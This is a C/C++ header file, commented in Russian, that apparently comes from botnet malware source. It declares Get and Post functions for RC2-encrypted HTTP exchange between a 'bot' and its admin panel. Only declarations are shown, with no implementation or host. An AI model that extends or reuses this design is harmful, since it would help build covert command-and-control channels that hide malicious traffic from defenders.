//***************************************************************************
//
//  Модуль включает шифрованный обмен данными бота с админкой
//
//***************************************************************************



//---------------------------------------------------------------------------

#ifndef CryptHTTPH
#define CryptHTTPH
//---------------------------------------------------------------------------

#include <windows.h>
#include "Strings.h"


//****************************************************************************
//  CryptHTTP -  методы шифрованного обмена с HTTP сервером
//  Для шифрования используется RC2Crypt
//****************************************************************************

namespace CryptHTTP
{
	// Загрузить шифрованный документ
	bool Get(PCHAR URL, PCHAR Password, PCHAR *Buf);

	// Функция отправляет зашифрованные пост данные на указанный
	// адрес. ключ берётся из глобальных настроек бота
	bool Post(PCHAR URL, PCHAR Password, PStrings Fields, PCHAR *Buf);


}




//---------------------------------------------------------------------------
#endif
